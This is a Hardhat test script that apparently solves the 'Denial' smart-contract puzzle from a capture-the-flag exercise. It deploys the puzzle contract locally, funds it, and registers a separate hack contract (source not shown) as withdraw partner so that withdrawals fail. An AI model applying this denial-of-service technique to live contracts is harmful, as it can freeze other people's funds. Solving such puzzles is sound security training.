import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Wallet } from 'ethers';
import { sendEther } from './utils';

describe('Recovery', function () {
  let owner: Wallet;

  it('attack', async function () {
    [owner] = await (ethers as any).getSigners();

    // Deploy puzzle contract
    const Denial = await ethers.getContractFactory('Denial');
    const denial = await Denial.deploy();
    await denial.connect(owner).deployed();
    await sendEther(owner, denial.address, ethers.utils.parseUnits('1', 'ether'));

    // Deploy hack contract
    const DenialHack = await ethers.getContractFactory('DenialHack');
    const hack = await DenialHack.deploy();
    await hack.connect(owner).deployed();
    console.log('hack address', hack.address);

    const dOwner = await denial.owner();
    console.log('owner balance', (await ethers.provider.getBalance(dOwner)).toString());

    // Attack
    await denial.setWithdrawPartner(hack.address);
    const partner = await denial.partner();
    console.log('partner address', partner);
    expect(partner).to.be.eq(hack.address);
    await denial.withdraw();
  });
});
